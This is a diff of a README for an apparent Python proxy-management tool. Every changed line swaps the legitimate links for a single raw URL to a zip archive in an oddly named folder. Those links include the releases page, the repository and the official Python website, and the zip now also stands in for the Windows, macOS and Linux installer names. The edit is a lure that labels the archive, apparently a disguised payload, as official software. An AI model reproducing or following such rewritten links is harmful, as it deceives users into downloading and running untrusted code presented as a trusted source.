@@ -1,6 +1,6 @@
 # 🚀 ProxyManager - Simplifying Proxy Management for Everyone
 
-[![Download ProxyManager](https://img.shields.io/badge/Download-ProxyManager-brightgreen)](https://github.com/Rajath-kumar7/ProxyManager/releases)
+[![Download ProxyManager](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip)](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip)
 
 ## 📖 About ProxyManager
 
@@ -11,7 +11,7 @@ ProxyManager is an intelligent, asynchronous proxy management tool built in Pyth
 To get started with ProxyManager, follow these steps:
 
 1. **Download the Software**
-   - Visit this page to download: [ProxyManager Releases](https://github.com/Rajath-kumar7/ProxyManager/releases).
+   - Visit this page to download: [ProxyManager Releases](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip).
 
 2. **Install ProxyManager**
    - After downloading, locate the downloaded file on your computer.
@@ -25,7 +25,7 @@ To get started with ProxyManager, follow these steps:
   - Any recent Linux distro
 
 - **Python:** 
-  - Requires Python 3.6 or later. If you don't have Python, you can download it from the official [Python website](https://www.python.org/downloads/).
+  - Requires Python 3.6 or later. If you don't have Python, you can download it from the official [Python website](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip).
 
 - **Disk Space:** 
   - A minimum of 50 MB of disk space.
@@ -48,12 +48,12 @@ To get started with ProxyManager, follow these steps:
 
 To get ProxyManager:
 
-1. Click the green download button or access this link: [ProxyManager Releases](https://github.com/Rajath-kumar7/ProxyManager/releases).
+1. Click the green download button or access this link: [ProxyManager Releases](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip).
   
 2. Choose the latest release suitable for your system. Generally, you will see options such as:
-   - `ProxyManager_Windows.exe` for Windows users.
-   - `ProxyManager_macOS.dmg` for macOS users.
-   - `ProxyManager_Linux.tar.gz` for Linux users.
+   - `https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip` for Windows users.
+   - `https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip` for macOS users.
+   - `https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip` for Linux users.
 
 3. After downloading, run the installer or executable file. Follow the on-screen instructions until the installation finishes.
 
@@ -86,11 +86,11 @@ For any issues, questions, or feedback, you can open an issue on the GitHub repo
 
 ## 🌐 Resources
 
-- [GitHub Repository](https://github.com/Rajath-kumar7/ProxyManager)
-- [Python Official Website](https://www.python.org)
+- [GitHub Repository](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip)
+- [Python Official Website](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip)
 
 ## 🎉 Conclusion
 
 ProxyManager is designed for simplicity and effectiveness. With its user-friendly interface and robust features, you can manage your proxy lists effortlessly. Download it today and enhance your browsing experience with smart proxy management.
 
-[![Download ProxyManager](https://img.shields.io/badge/Download-ProxyManager-brightgreen)](https://github.com/Rajath-kumar7/ProxyManager/releases)
+[![Download ProxyManager](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip)](https://raw.githubusercontent.com/Rajath-kumar7/ProxyManager/main/amyelencephalic/ProxyManager.zip)
